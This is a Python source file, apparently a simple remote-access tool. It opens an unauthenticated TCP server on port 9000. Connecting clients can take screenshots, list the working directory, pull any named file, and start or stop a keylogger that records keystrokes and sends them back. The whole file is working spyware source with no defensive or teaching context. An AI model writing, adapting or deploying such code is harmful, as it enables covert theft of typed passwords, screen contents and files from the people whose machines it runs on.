import socket
import os
import io
from PIL import ImageGrab
from pynput import keyboard
from datetime import datetime

is_recording = False
keyboard_listener = None
recorded_keys = []

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # Menghubungkan ke alamat yang tidak perlu ada untuk mendapatkan IP lokal
        s.connect(('10.254.254.254', 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'  # Fallback jika tidak bisa mendapatkan IP
    finally:
        s.close()
    return local_ip

def on_press(key):
    global recorded_keys, is_recording
    if is_recording:  # Only record keys if recording is active
        try:
            if hasattr(key, 'char') and key.char is not None:
                recorded_keys.append(key.char)
            else:
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BKSP]'
                }
                recorded_keys.append(special_keys.get(key, f'[{str(key)}]'))
        except Exception as e:
            print("Error recording key:", e)

def setup_keyboard_listener():
    global keyboard_listener
    if keyboard_listener is None:
        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.start()

def stop_keyboard_listener():
    global keyboard_listener, is_recording
    if keyboard_listener is not None:
        keyboard_listener.stop()
        keyboard_listener = None
    is_recording = False

def handle_client(conn):
    global is_recording, recorded_keys

    try:
        command = conn.recv(1024).decode()
        print(f"Received command: {command}")

        if command == 'screenshot':
            screenshot = ImageGrab.grab()
            byte_io = io.BytesIO()
            screenshot.save(byte_io, 'JPEG')
            screenshot_data = byte_io.getvalue()
            conn.sendall(len(screenshot_data).to_bytes(4, 'big') + screenshot_data)

        elif command == 'list_files':
            files = os.listdir('.')
            files_list = "\n".join(files).encode()
            conn.sendall(len(files_list).to_bytes(4, 'big') + files_list)

        elif command.startswith('get_file'):
            filename = command.split(' ', 1)[1]
            if os.path.isfile(filename):
                with open(filename, 'rb') as f:
                    file_data = f.read()
                conn.sendall(len(file_data).to_bytes(4, 'big') + file_data)
            else:
                conn.sendall((7).to_bytes(4, 'big') + b"NO_FILE")
        if command == 'start_keystroke':
            if not is_recording:
                is_recording = True
                recorded_keys.clear()
                if not keyboard_listener:
                    setup_keyboard_listener()
            start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Mengambil waktu mulai
            conn.sendall(f"Keystroke recording started at {start_time}".encode())

        elif command == 'stop_keystroke':
            is_recording = False
            stop_keyboard_listener()
            # Mengirim log ke klien tanpa menyimpannya ke file
            recorded_data = ''.join(recorded_keys).encode('utf-8')
            conn.sendall(len(recorded_data).to_bytes(4, 'big') + recorded_data)


    except Exception as e:
        print("Error handling command:", e)

    finally:
        conn.close()  # Close the connection after handling the command

def main():
    # Mendapatkan IP lokal secara otomatis
    SERVER_HOST = get_local_ip()  # Dapatkan IP lokal perangkat
    SERVER_PORT = 9000

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")

    while True:
        print("Waiting for a client command...")
        conn, addr = server_socket.accept()
        print(f"Connection from {addr} accepted")
        handle_client(conn)

if __name__ == "__main__":
    main()
